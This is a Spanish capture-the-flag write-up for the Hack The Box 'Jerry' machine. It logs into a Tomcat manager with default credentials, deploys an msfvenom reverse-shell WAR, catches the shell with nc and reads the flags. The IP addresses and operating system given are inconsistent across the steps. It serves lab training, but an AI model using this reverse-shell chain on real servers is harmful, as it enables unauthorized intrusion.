## HTB-Jerry
- Maquina: Linux
- Level: Easy
- IP: 10.10.10.14

## Herramientas a utilizar:

- nmap
- msfvenom
- curl
- nc

```
nmap -sV -sC -Pn -o scan_jerry.txt 10.10.10.96
```

Notaremos que tenemos un tomcat escuchando por el puerto 8080.
```
http://10.10.10.95:8080
```
Y un manejador en:
```
http://10.10.10.95:8080/manager/html
```

Aqui tenemos un panel que nos solicita usuario y passowrd,al intentar y no tener exito notaras que el mensaje de error
nos dice como debe realmente acceder
```
user:tomcat
pass:s3cret
```

Luego de acceder y verificar, veremos que tenemos la faculta de subir archivo en `WAR FILE TO DEPLOY`
Para esto creare un exploit para tener una shell.
```
msfvenom -p windows/shell_reverse_tcp LHOST=(nuestra ip de vpn_htb) LPORT=44444 -f war > rs_r0ok1e.war
```
En una nueva terminal nos ponernos en escucha por el puerto 44444 para la reverse_shell
```
nc -lvpn 44444
```
subimos nuestra shell `rs_r0ok1e.war` a `WAR FILE TO DEPLOY`.
Una ves tengamos el archivo cargado, ejecutamos lo siguiente:
```
jar -tf rs_r0ok1e.war
```
Esto arrojara un output de lo cual solo nos interesa el nombre que termine con `.jsp` en mi caso fue **wdwxbdssjlo.jsp**
Luego en ejecutamos:
```
curl http://10.10.10.95:8080/rs_r0ok1e/wdwxbdssjlo.jsp
```
Listo, Ya logramos acceder a jerry y nuestras flags estan en:
```
cd C\Users\Administrator\Desktop\flags\
```
Aqui encontraremos un archivo llamado `2 for the price of 1.txt` 🤣
Para leer este archivo solo debemo ejecutar
```
type 2*
```
Listo aqui tenemos nuestras dos Flag 😂
